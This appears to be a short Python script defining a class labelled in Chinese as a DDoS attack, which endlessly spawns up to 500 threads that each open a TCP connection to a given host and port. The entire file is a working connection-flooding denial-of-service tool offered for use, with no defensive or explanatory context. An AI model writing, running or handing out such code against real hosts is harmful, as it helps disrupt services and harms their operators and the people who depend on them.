import socket, time
from threading import Thread, active_count

class DDos:
    """
    ddos攻击
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def __ddos(self):
        sock = socket.socket()
        sock.connect((self.host, self.port))

    def start(self):
        while 1:
            if active_count() <= 500:
                Thread(target=self.__ddos).start()
            else:
                time.sleep(2)